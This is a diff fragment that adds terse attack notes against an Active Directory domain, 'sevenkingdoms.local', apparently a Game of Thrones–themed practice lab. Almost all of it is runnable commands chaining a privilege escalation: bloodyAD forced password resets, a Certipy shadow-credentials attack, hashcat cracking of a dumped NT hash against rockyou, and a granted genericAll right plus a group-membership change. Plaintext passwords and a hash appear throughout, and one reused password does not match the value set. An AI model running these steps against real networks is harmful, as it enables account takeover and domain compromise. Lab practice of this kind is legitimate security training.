@@ -442,3 +442,40 @@ WHERE
   u.admincount = false AND 
   NOT toLower(u.name) CONTAINS 'key' 
 RETURN p
+---
+
+
+tywin -> jaime
+---
+
+export PATH="$PATH:/root/.local/bin"
+
+D=sevenkingdoms.local
+
+DC=192.168.88.10
+
+P='powerkingftw135'
+
+bad(){ bloodyAD --host kingslanding.sevenkingdoms.local -d "$D" --dc-ip "$DC" "$@"; }
+
+bad -u tywin.lannister -p "$P" set password jaime.lannister 'NewPass1234!'
+
+nxc smb "$DC" -u jaime.lannister -p 'NewPass1234!'
+
+---
+jaime->joffrey
+
+certipy shadow auto -u jaime.lannister@$D -p 'NewPass123!' -account joffrey.baratheon -dc-ip $DC
+echo 3b60abbc25770511334b3829866b08f1 > joffrey.nt
+hashcat -m 1000 joffrey.nt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 joffrey.nt /usr/share/wordlists/rockyou.txt --show
+---
+joffrey->tyron
+
+
+bad -u joffrey.baratheon -p '1killerlion' add genericAll tyron.lannister joffrey.baratheon
+bad -u joffrey.baratheon -p '1killerlion' set password tyron.lannister 'NewPass123!'
+nxc smb "$DC" -u joffrey.baratheon -p '1killerlion'        # [+]
+bad -u joffrey.baratheon -p '1killerlion' set password tyron.lannister 'NewPass123!'
+nxc smb "$DC" -u tyron.lannister -p 'NewPass123!'          # [+]
+bad -u tyron.lannister -p 'NewPass123!' add groupMember DRAGONSTONE tyron.lannister
